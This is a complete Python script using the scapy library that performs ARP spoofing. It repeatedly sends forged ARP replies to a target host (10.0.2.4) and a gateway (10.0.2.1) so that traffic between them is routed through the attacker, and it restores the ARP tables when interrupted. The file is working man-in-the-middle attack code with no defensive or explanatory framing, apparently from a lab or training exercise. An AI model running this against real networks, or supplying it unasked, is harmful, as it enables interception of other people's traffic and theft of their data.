#!/usr/bin/env python

import scapy.all as scapy
import time, sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(targett_ip, spoof_ip):
    target_mac = get_mac(targett_ip)
    packet = scapy.ARP(op=2, pdst=targett_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.4"
gateway_ip = "10.0.2.1"

try:
    packet_sent_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        packet_sent_count = packet_sent_count + 2
        print("\r[+] sent " + str(packet_sent_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTL +C... resetting ARP tables....please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
